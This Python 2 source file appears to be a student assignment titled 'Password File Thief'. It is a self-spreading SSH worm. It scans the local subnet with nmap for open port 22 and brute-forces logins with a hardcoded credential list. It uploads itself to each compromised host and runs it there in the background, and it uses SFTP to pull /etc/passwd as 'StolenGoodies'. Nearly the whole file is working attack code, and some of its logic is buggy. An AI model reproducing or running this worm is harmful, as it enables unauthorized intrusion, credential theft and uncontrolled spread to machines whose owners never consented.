#####################################################
#	Cameron Walters
#	CPSC 456
#	Password File Thief
#	10/21/2016
#####################################################

import paramiko
import sys
import nmap
import os
import urllib
import socket
import fcntl
import struct
import netifaces
from subprocess import call

# The list of credentials to attempt
credList = [
('ubuntu', '123456'),
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc')
]

# The marker
INFECTION_MARKER_FILE = "infectedPT.txt"


######################################################
# Mark the system as infected
#####################################################
def markInfected():
	
	# Open the file
	markerFile = open(INFECTION_MARKER_FILE, "w")
	
	# Write something to the file
	markerFile.write("Dude where the Worms AT?")
	
	markerFile.close()

##################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################
def isInfected():
	
	if ( os.path.exists( INFECTION_MARKER_FILE ) ): return True
	else: return False
	
#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	return liveHosts




###############################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
##############################################
def spreadAndExecute(sshClient):
	
	# Create an instance of the SFTP class; used
	# for uploading/downloading files and executing
	# commands.
	sftpClient = sshClient.open_sftp()


	# Copy your self to the remote system (i.e. the other VM). 
	# We are assuming the
	# password has already been cracked. The worm is placed in the /tmp
	# directory on the remote system.
	sftpClient.put(__file__, "PassThief.py")

	# Make the worm file exeutable on the remote system
	sshClient.exec_command("chmod a+x PassThief.py")

	# Execute the worm!
	# nohup - keep the worm running after we disconnect.
	# python - the python interpreter
	# /tmp/worm.py - the worm script
	# & - run the whole commnad in the background
	sshClient.exec_command("nohup python PassThief.py &")
	return


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):

	
	# Try to connect to the remote host
	try:
		print "Attacking host: " + host + "..." + userName,
		sshClient.connect(host, username=userName, password=password)
		print "Success!"
		return 0
	# The SSH is down
	except socket.error:
		print "The system seems to be no longer up!"
		return 3
	except paramiko.ssh_exception.AuthenticationException:
		print "Wrong credentials!"
		return 1



######################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
######################################################
def attackSystem(host):

	# The credential list
	global credList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# The results of an attempt
	attemptResults = None
	
	for (username, password) in credList:
		temp = tryCredentials(host, username, password, ssh)

		if   (temp == 0) : return (ssh, username, password)
		elif (temp == 1) : pass
		elif (temp == 3) : break
		else : pass
	
	#Couldn't find Good Creds
	return None

#############################################
# Retrieves the ip of the network card with 
# an IPv4 address that is not 127.0.0.1.
# @return - the string containing the IP 
# address of the network adapter that is not
# if the IP is not 127.0.0.1; returns None
# if no such interface is detected
##############################################
def getMyIP():

	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr


print getMyIP()	


##############################################
#	Password THEIF
#		Stealin Yo Passwords
##############################################
def stealPasswords(theifIP, currentIP):
	
	theifssh = attackSystem(theifIP)	

	sftp = theifssh.open_sftp()
	
	sftp.get("/etc/passwd", "StolenGoodies" + currentIP)

#############################################



if len(sys.argv) < 2:
	
	AttackingIP = sys.argv[1]
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if isInfected():
		print "System has been PwD"
		pass
	else:

		# TODO: Get the IP of the current system
		myIP = getMyIP()
		
		# Get the hosts on the same network
		networkHosts = getHostsOnTheSameNetwork()

		for index in range(len(networkHosts)-1):
			if (networkHosts[index] == myIP): 
				del networkHosts[index]

		# TODO: Remove the IP of the current system
		# from the list of discovered systems (we
		# do not want to target ourselves!).
		print "Found hosts: ", networkHosts

		# Go through the network hosts
		for host in networkHosts:
	
			# Try to attack this host
			sshInfo =  attackSystem(host)
	
			print sshInfo
	
			# Did the attack succeed?
			if sshInfo:
		
				stealPasswords(AttackingIP, myIP)
				
				print "Trying to spread"
				
				spreadAndExecute(sshInfo[0])
			
				print "Spreading complete"
				sys.exit(0)

	

